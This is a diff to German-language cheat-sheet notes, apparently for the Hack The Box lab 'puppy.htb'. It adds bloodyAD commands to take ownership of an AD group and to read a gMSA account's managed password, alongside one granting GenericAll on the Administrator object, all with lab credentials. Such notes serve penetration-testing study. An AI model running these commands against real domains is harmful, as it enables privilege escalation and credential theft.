@@ -39,3 +39,24 @@ Versucht, dem Benutzer Levi.James die GenericAll-Berechtigung auf das AD-Objekt 
 ```zsh
 bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add genericAll "CN=Administrator,CN=Users,DC=puppy,DC=htb" levi.james
 ```
+
+<br>
+
+🧩 **Write Owner**
+
+Mit diesem Befehl überträgst du diesen „Besitz“ auf einen anderen User. In diesem Fall wir levi.james der Besitzer der Gruppe DEVELOPERS
+```zsh
+bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' set owner "CN=DEVELOPERS,DC=puppy,DC=htb" levi.james
+
+```
+
+<br>
+
+🧩 **ReadGMSAPassword**
+
+Verschlüsseltes Passwort eines gMSA-Kontos (Group Managed Service Account) aus Active Directory abfragen.
+```zsh
+bloodyAD --host 10.129.204.169 -d puppy.htb -u levi.james -p 'KingofAkron2025!' get object "CN=gmsa-web,CN=Managed Service Accounts,DC=puppy,DC=htb" --attr msDS-ManagedPassword
+```
+
+
